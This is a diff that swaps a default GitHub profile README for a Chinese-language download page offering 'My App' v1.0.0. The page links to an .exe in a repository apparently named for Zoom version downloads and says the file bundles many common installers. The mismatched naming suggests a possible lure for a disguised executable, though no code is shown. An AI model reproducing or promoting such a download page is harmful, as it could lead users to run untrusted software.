@@ -1,12 +1,18 @@
-- 👋 Hi, I’m @endian777
-- 👀 I’m interested in ...
-- 🌱 I’m currently learning ...
-- 💞️ I’m looking to collaborate on ...
-- 📫 How to reach me ...
-- 😄 Pronouns: ...
-- ⚡ Fun fact: ...
+# My App 下载
 
-<!---
-endian777/endian777 is a ✨ special ✨ repository because its `README.md` (this file) appears on your GitHub profile.
-You can click the Preview link to take a look at your changes.
---->
+## 最新版本
+**v1.0.0**
+
+## 下载地址
+👉 [点击下载 Windows 版](https://github.com/endian777/zoom常见版本下载/releases/download/v1.0.0/MyApp-1.0.0.exe)
+
+## 系统要求
+-用户可以根据自己的需要来进行下载，里面包含了许多的常见安装包
+
+## 安装说明
+1. 下载完成后双击安装包
+2. 按提示完成安装
+
+## 更新日志
+### v1.0.0
+- 初始版本发布
